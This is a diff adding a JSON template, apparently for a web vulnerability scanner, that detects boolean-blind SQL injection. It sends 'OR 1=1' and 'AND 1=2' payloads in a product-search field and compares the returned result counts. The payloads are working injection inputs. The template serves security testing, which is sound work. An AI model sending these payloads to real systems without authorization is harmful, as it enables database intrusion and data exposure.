@@ -1,0 +1,49 @@
+{
+  "name": "web/SQLi boolean-blind response differential",
+  "description": "[mid] Boolean-blind SQLi as a response differential (CWE-89; OWASP WSTG SQLi): OR 1=1 vs AND 1=2 on the same input flips the JSON result count while status stays 200 — the count divergence is the injection oracle. Keywords: sql injection boolean blind differential oracle json count. ctrl: sanitized queries return identical counts -> not falsified. base_url = JSON search endpoint; copy skill to rename the count field.",
+  "cwe": "CWE-89",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/api/products/search",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"category\": \"gifts' OR 1=1 -- \"}"
+    },
+    "payload_false": {
+      "method": "POST",
+      "url": "{{base_url}}/api/products/search",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"category\": \"gifts' AND 1=2 -- \"}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "status",
+      "request": "payload_false",
+      "equals": 200
+    },
+    {
+      "type": "json_differs",
+      "request_a": "payload",
+      "request_b": "payload_false",
+      "json_path": "total"
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "799c45d2e1f9",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
